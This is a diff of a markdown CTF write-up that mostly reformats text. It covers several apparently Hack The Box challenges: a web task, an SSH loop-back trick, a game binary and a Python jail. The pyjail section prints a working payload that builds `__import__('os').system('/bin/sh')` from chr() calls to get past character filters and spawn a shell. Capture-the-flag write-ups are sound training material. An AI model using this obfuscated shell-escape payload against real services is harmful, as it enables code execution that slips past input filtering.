@@ -75,7 +75,7 @@ slides:
 
 **Difficulty:** Very Easy
 
-We are given a website to work with. Initially, connection to the website would result in **"404 Not Found"**. I then went to read the descriptions, and from it, I got to know that we should send at least **1000 GET requests** to **/flag** to maybe get the flag.
+We are given a website to work with. Initially, connection to the website would result in **"404 Not Found"**. I then went to read the descriptions, and from it, I got to know that we should send at least **1000 GET requests** to `/flag` to maybe get the flag.
 
 I used this below Python script to automate the task.
 
@@ -168,7 +168,7 @@ First, we connect to the SSH server using the username **restricted**.
 
 <img src="misc2.png" alt="dnSpy" width="1000"/>
 
-From the source, we also know that the exposed port is 1337. Then, we can use SSH self loop-back to have the permission to use cat, since we also know that **flag.txt** is changed to **flag_*** (with * represents some random bytes) and lies in plainsight.
+From the source, we also know that the exposed port is **1337**. Then, we can use SSH self loop-back to have the permission to use cat, since we also know that `flag.txt` is changed to `flag_*` (with * represents some random bytes) and lies in plainsight.
 
 <img src="misc3.png" alt="dnSpy" width="1000"/>
 
@@ -274,9 +274,9 @@ Flag is: **HTB{d1v1d3_bY_Z3r0_3rr0r}**
 
 **Difficulty:** Easy
 
-There are 2 noticable functions called within *main()* which is *game()* and *get_prize()*.
+There are 2 noticable functions called within **main()** which is **game()** and **get_prize()**.
 
-The *get_prize()* function simply gives us the flag so we won't go too deep into it. But in order for this function to be called. We have to win 100 games of rock, paper, scissors. A.K.A. the *game()* function.
+The **get_prize()** function simply gives us the flag so we won't go too deep into it. But in order for this function to be called. We have to win 100 games of rock, paper, scissors. A.K.A. the **game()** function.
 
 Having analyzed it, we got the following code:
 
@@ -361,13 +361,13 @@ Flag is: **HTB{r0ck_p4p3R_5tr5tr_l0g1c_buG}**
 
 **Difficulty:** Medium
 
-A classic pyjail challenge with no source code. It filtered out some special characters like **', ", _, ., /** so we couldn't directly execute any code.
+A classic pyjail challenge with no source code. It filtered out some special characters like `' " _ . /` so we couldn't directly execute any code.
 
 One way to bypass this is to break down the string of code we want to execute into individual characters and concatenate them together using the *+* operator.
 
-We can bypass the **'** and **"** filter simply by using chr(hex-value-of-the-ascii-character) to make the character we want.
+We can bypass the `'` and `"` filter simply by using `chr(hex-value-of-the-ascii-character)` to make the character we want.
 
-For this I used `eval("\__import__('os').system('/bin/sh')")`. The payload for this is:
+For this I used `eval("__import__('os').system('/bin/sh')")`. The payload for this is:
 
 ```
 eval(chr(0x5f)+chr(0x5f)+chr(0x69)+chr(0x6d)+chr(0x70)+chr(0x6f)+chr(0x72)+chr(0x74)+chr(0x5f)+chr(0x5f)+chr(0x28)+chr(0x27)+chr(0x6f)+chr(0x73)+chr(0x27)+chr(0x29)+chr(0x2e)+chr(0x73)+chr(0x79)+chr(0x73)+chr(0x74)+chr(0x65)+chr(0x6d)+chr(0x28)+chr(0x27)+chr(0x2f)+chr(0x62)+chr(0x69)+chr(0x6e)+chr(0x2f)+chr(0x73)+chr(0x68)+chr(0x27)+chr(0x29))
